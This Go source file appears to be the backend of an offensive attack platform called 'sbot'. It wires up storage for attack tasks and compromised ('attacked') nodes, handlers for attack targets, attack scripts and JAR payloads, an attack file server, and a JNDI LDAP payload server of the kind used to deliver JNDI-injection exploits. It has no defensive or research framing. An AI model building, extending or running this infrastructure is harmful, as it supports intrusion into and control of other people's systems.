package backend

import (
	"fmt"
	"github.com/sbot/handler"
	"github.com/sbot/jndi"
	"github.com/sbot/rpc"
	"github.com/sbot/server"
	"github.com/sbot/store"
	redisstore "github.com/sbot/store/redis"
	"github.com/sbot/utils/jsonutils"
	"strconv"
	"strings"
)

const (
	AttackTaskDB    = "AttackTasksDB"
	AttackTaskTable = "AttackTasksTable"

	AttackedNodeDB         = "AttackedNodesDB"
	AttackedNodeDBTable    = "AttackedNodesTable"
	NodeAttackProcessTable = "AttackProcessTable"

	AttackFileDownloadDB    = "AttackFileDownloadDB"
	AttackFileDownloadTable = "AttackFileDownloadTable"
	DBConnectTimeout        = 50000
)

type SbotBackend struct {

	cfg *Config

	rpcService *rpc.GRPCService

	attackFileServer *server.AttackFileServer

	jndiServer *jndi.JndiServer

	fserver *server.HttpFileServer
}

func openRedisDB(cfg *Config, db, table string) (store.Store, error) {

	var redisDb redisstore.RedisStore

	dbCfg := &store.Config{
		DB:      db,
		Table:   table,
		Host:    cfg.DBHost,
		Port:    cfg.DBPort,
		User:    cfg.DBUser,
		Pass:    cfg.DBPass,
		Codes:   "",
		Timeout: DBConnectTimeout,
	}

	rdb, err := redisDb.Open(dbCfg)

	if err != nil {

		log.WithField("database", db).
			WithField("table", table).
			WithField("address", fmt.Sprintf("%s:%d", cfg.DBHost, cfg.DBPort)).
			Error("Cannot open redis......")

		return nil, err
	}

	return rdb, nil
}

func makeNodeHandle(cfg *Config, db store.Store) (*handler.NodeHandler, error) {

	dbnode, err := openRedisDB(cfg, AttackedNodeDB, AttackedNodeDBTable)
	if err != nil {

		return nil, err
	}

	attackProcessDB, err := openRedisDB(cfg, AttackedNodeDB, NodeAttackProcessTable)
	if err != nil {

		return nil, err
	}

	return handler.NewNodeHandler(dbnode, attackProcessDB,db), nil

}

func makeAttackTaskHandle(cfg *Config) (*handler.AttackTaskHandler, error) {

	db, err := openRedisDB(cfg, AttackTaskDB, AttackTaskTable)
	if err != nil {

		return nil, err
	}

	jport,err := strconv.ParseInt(strings.Split(cfg.JNDILdapAddress,":")[1],10,32)

	if err!=nil {
		return nil,err
	}

	return handler.NewAttackTaskHandler(cfg.CBotFileStoreDir,
		cfg.AttackFileServerDir,
		cfg.RHost, cfg.RPort,
		cfg.AttackFileServerPort,
		int(jport),
		db), nil
}

func makeAttackFileDownloadHandle(cfg *Config,attackTaskDB store.Store) (*handler.AttackFileServerHandle, error) {

	db, err := openRedisDB(cfg, AttackFileDownloadDB, AttackFileDownloadTable)
	if err != nil {

		return nil, err
	}

	return handler.NewAttackFileServerHandle(db,attackTaskDB), nil
}

func makeSbotQueryHandle(cfg *Config) (*handler.SbotQueryHandler,error) {

	dbnode, err := openRedisDB(cfg, AttackedNodeDB, AttackedNodeDBTable)
	if err != nil {

		return nil, err
	}

	attackProcessDB, err := openRedisDB(cfg, AttackedNodeDB, NodeAttackProcessTable)
	if err != nil {

		return nil, err
	}

	attackTaskDB, err := openRedisDB(cfg, AttackTaskDB, AttackTaskTable)
	if err != nil {

		return nil, err
	}

	downloadDB, err := openRedisDB(cfg, AttackFileDownloadDB, AttackFileDownloadTable)
	if err != nil {

		return nil, err
	}

	return handler.NewSbotQueryHandler(cfg.RHost,attackTaskDB,dbnode,attackProcessDB,downloadDB),nil
}

func NewSbotBacked(cfile string) (*SbotBackend, error) {

	var cfg Config

	if err := jsonutils.UNMarshalFromFile(&cfg, cfile); err != nil {

		log.Errorf("load config from file:%s is failed\n", cfile)
		return nil, err
	}

	attackTaskHandle, err := makeAttackTaskHandle(&cfg)
	if err != nil {

		log.Errorf("Create attack task handler failed:%v\n", err)
		return nil, err
	}

	nodeHandle, err := makeNodeHandle(&cfg,attackTaskHandle.GetAttackTaskDB())
	if err != nil {

		log.Errorf("Create attacked node handler failed:%v\n", err)
		return nil, err
	}

	attackFileDownloadHandle, err := makeAttackFileDownloadHandle(&cfg,attackTaskHandle.GetAttackTaskDB())
	if err != nil {

		log.Errorf("Create attack file download handler failed:%v\n", err)
		return nil, err
	}

	sbotQueryHandle ,err := makeSbotQueryHandle(&cfg)
	if err!=nil {

		log.Errorf("Create sbot query handler failed:%v\n",err)
		return nil,err
	}

	attackTargetsHandle,err := handler.NewAttackTargetsHandler(cfg.AttackTargetsCFile,cfg.AttackTargetsQueueCapacity,cfg.AttackTargetsWaitTimeout)

	if err!= nil {
		log.Errorf("Create attack targets handler failed:%v\n",err)
		return nil,err
	}

	attackScriptsHandle,err := handler.NewAttackScriptsHandler(cfg.AttackScriptsCFile,cfg.AttackScriptsQueueCapacity,cfg.AttackScriptsWaitTimeout)

	if err!=nil {
		log.Errorf("Create attack scripts handler failed:%v\n",err)
		return nil,err

	}

	jndiServer,err := jndi.NewJndiServer(cfg.JNDILdapPayloadDir,cfg.JNDILdapAddress,cfg.JNDILdapCodeBase)
	if err!=nil {
		log.Errorf("Create jndi ldap server failed:%v\n",err)
		return nil,err
	}

	rpcCfg := &rpc.Config{
		Host:     "0.0.0.0",
		Port:     cfg.RPort,
		CertFlag: cfg.CertFlag,
		KeyFlag:  cfg.KeyFlag,
		FDir:     cfg.RDownloadDir,
	}

	return &SbotBackend{
		cfg:              &cfg,
		rpcService:       rpc.NewGRPCService(rpcCfg,
			attackTaskHandle,
			nodeHandle,
			handler.NewAttackJarPayloadHandle(cfg.CBotFileStoreDir,cfg.JavaVersion),
			sbotQueryHandle,attackTargetsHandle,attackScriptsHandle),
		attackFileServer: server.NewAttackFileServer(attackFileDownloadHandle,
			cfg.AttackFileServerDir,
			"0.0.0.0",
			cfg.AttackFileServerPort),

			jndiServer:jndiServer,

			fserver: server.NewHttpFileServer(cfg.HttpFileServerDir,cfg.HttpFileServerAddr),
	}, nil

}



func (sb *SbotBackend) Start() {

	//start rpc
	sb.rpcService.Start()

	go sb.attackFileServer.Start()

	go sb.fserver.Start()

	go sb.jndiServer.Start()


}

